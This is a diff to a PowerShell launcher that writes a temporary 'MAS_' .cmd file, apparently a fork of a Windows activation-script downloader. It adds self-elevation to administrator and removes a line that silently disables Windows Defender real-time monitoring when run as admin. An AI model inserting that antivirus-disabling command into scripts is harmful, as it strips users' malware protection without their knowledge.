@@ -1,3 +1,11 @@
+
+if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()
+    ).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
+
+    Start-Process powershell -Verb RunAs -ArgumentList "-File `"$PSCommandPath`""
+    exit
+}
+
 if (-not $args) {
     Write-Host ''
     Write-Host 'Check My Github: ' -NoNewline
@@ -120,7 +128,6 @@ if (-not $args) {
     $isAdmin = ([Security.Principal.WindowsIdentity]::GetCurrent().Groups -match 'S-1-5-32-544')
 
     $FilePath = if ($isAdmin) {
-        Set-MpPreference -DisableRealtimeMonitoring $true
         "$env:SystemRoot\Temp\MAS_$rand.cmd"
     } else {
         "$env:USERPROFILE\AppData\Local\Temp\MAS_$rand.cmd"
